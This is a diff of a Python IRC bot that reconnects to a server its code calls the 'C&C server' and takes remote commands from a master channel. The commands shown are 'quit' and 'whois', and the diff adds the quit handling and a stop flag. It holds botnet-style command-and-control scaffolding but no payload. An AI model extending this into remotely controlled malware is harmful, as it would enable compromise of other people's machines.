@@ -30,17 +30,18 @@ class Bot():
         thread.start()
 
     def run(self):
-        self.print_envs()
-        try:
-            self.join_master_server()
-        except:
-            print("Could not connect to C&C server")
-        try:
-            self.join_host_server()
-        except:
-            print("Could not connect to " + self.server)
+        while self.stop == False:
+            self.print_envs()
+            try:
+                self.join_master_server()
+            except:
+                print("Could not connect to C&C server")
+            try:
+                self.join_host_server()
+            except:
+                print("Could not connect to " + self.server)
 
-        self.listen()
+            self.listen()
 
     def print_envs(self):
 
@@ -94,70 +95,73 @@ class Bot():
 
         # Listening both host and master servers, need to respond to PING on both servers
 
-        while 1:
+        while 1 and self.stop == False:
             msg = ""
-            while msg.find("QUIT") == -1:
-                time.sleep(1)
+            time.sleep(1)
 
-                # Using select-library to manage socket statuses, otherwise answering takes a long time while in wait-loop
+            # Using select-library to manage socket statuses, otherwise answering takes a long time while in wait-loop
 
-                readables, writables, exceptionals = select.select([self.master_sock], [self.master_sock],
-                                                                   [self.master_sock])
-                if len(readables) == 1:
-                    msg = ""
-                    try:
-                        msg = self.master_sock.recv(2048).decode("UTF-8")
-                    except:
-                        print("Connection failed with C&C server")
-                        self.join_master_server()
-                        self.listen()
+            readables, writables, exceptionals = select.select([self.master_sock], [self.master_sock],
+                                                               [self.master_sock])
+            if len(readables) == 1:
+                try:
+                    msg = self.master_sock.recv(2048).decode("UTF-8")
+                except:
+                    print("Connection failed with C&C server")
+                    self.join_master_server()
+                    self.listen()
 
-                    if len(msg) > 0:
-                        buffer = msg.split("\r\n")
-                        for line in buffer:
-                            # print(line)
-                            line = line.split(" ")
-                            if line[0] == "PING":
-                                self.send(self.master_sock, "PONG " + line[1])
+                if len(msg) > 0:
+                    buffer = msg.split("\r\n")
+                    for line in buffer:
+                        # print(line)
+                        line = line.split(" ")
+                        if line[0] == "PING":
+                            self.send(self.master_sock, "PONG " + line[1])
 
-                            if len(line) >= 4:
-                                if line[1] == "PRIVMSG":
-                                    if line[3][1:].lower() == "cmd":
-                                        command = line[4] + " " + line[5]
+                        if len(line) >= 4:
 
-                                        # Could ask also universal command-function instead of
-                                        # writing different functions for every command
+                            if line[1] == "PRIVMSG":
 
-                                        if line[4].lower() == "whois":
-                                            self.whois(line[5])
-                    else:
-                        print(self.server + " lost connection to C&C, connecting again...")
-                        self.join_master_server()
-                        self.listen()
+                                if line[3][1:].lower() == "quit":
+                                    self.send(self.master_sock, "PRIVMSG " + MASTERCHANNEL + " :" + "[" + self.botnick + "]: " +  "quitting...")
+                                    self.stop = True
+                                    print(self.botnick +  " killing itself")
 
-                readables, writables, exceptionals = select.select([self.host_sock], [self.host_sock],
-                                                                   [self.host_sock])
-                if len(readables) == 1:
-                    try:
-                        host_msg = self.host_sock.recv(2048).decode("UTF-8")
-                    except:
-                        print("Connection failed with "+ self.server + " server")
-                        self.join_host_server()
-                        self.listen()
+                                if line[3][1:].lower() == "cmd":
+                                    command = line[4] + " " + line[5]
 
-                    if len(host_msg) > 0:
-                        host_msg_buf = host_msg.split("\r\n")
-                        for line in host_msg_buf:
-                            # print(line)
-                            line = line.split(" ")
-                            if line[0] == "PING":
-                                self.send(self.host_sock, "PONG " + line[1])
-                    else:
-                        print(self.server + " lost connection to " + self.server + ", connecting again...")
-                        self.join_host_server()
-                        self.listen()
+                                    # Could ask also universal command-function instead of
+                                    # writing different functions for every command
 
-            self.stop = True
+                                    if line[4].lower() == "whois":
+                                        self.whois(line[5])
+                else:
+                    print(self.server + " lost connection to C&C, connecting again...")
+                    self.join_master_server()
+                    self.listen()
+
+            readables, writables, exceptionals = select.select([self.host_sock], [self.host_sock],
+                                                               [self.host_sock])
+            if len(readables) == 1:
+                try:
+                    host_msg = self.host_sock.recv(2048).decode("UTF-8")
+                except:
+                    print("Connection failed with "+ self.server + " server")
+                    self.join_host_server()
+                    self.listen()
+
+                if len(host_msg) > 0:
+                    host_msg_buf = host_msg.split("\r\n")
+                    for line in host_msg_buf:
+                        # print(line)
+                        line = line.split(" ")
+                        if line[0] == "PING":
+                            self.send(self.host_sock, "PONG " + line[1])
+                else:
+                    print(self.server + " lost connection to " + self.server + ", connecting again...")
+                    self.join_host_server()
+                    self.listen()
 
     def whois(self, nick):
         msg_success = self.send(self.host_sock, "WHOIS " + nick)
